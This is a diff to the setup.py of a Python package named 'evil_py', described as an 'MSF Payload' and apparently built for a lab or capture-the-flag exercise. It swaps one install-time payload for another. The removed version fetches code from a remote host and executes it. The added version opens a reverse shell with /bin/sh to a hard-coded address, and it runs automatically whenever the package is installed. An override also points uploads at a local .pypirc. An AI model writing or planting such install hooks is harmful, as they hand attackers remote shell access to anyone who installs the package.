@@ -1,24 +1,23 @@
-import socket, struct, time, os
-import setuptools
+import setuptools, os
 from setuptools.command.install import install
+from distutils.command.upload import upload as upload_orig
 
 class evil_py_class(install):
   def run(self):
-    for x in range(10):
-      try:
-        s=socket.socket(2,socket.SOCK_STREAM)
-        s.connect(('10.14.1.6',13043))
-        break
-      except:
-        time.sleep(5)
-    l=struct.unpack('>I',s.recv(4))[0]
-    d=s.recv(l)
-    while len(d)<l:
-      d+=s.recv(l-len(d))
-    exec(d,{'s':s})
+    import sys,socket,pty
+    try:
+        s=socket.socket()
+        s.settimeout(5)
+        s.connect(("10.10.14.7",80))
+        [os.dup2(s.fileno(),fd) for fd in (0,1,2)]
+        pty.spawn("/bin/sh")
+    except:
+        pass
 
-with open("README.md", "r") as fh:
-    long_description = fh.read()
+class upload(upload_orig):
+
+    def _get_rc_file(self):
+        return os.path.join('.', '.pypirc')
 
 setuptools.setup(
   name="evil_py",
@@ -26,9 +25,9 @@ setuptools.setup(
   author="sn0wfa11",
   author_email="dontemail@me.com",
   description="MSF Payload",
-  long_description=long_description,
+  long_description="",
   long_description_content_type="text/markdown",
-  url="https://github.com/sn0wfa11",
+  url="https://github.com/SimonGurney",
   packages=setuptools.find_packages(),
-  cmdclass={ "install": evil_py_class }
+  cmdclass={ "install": evil_py_class, "upload": upload }
 )
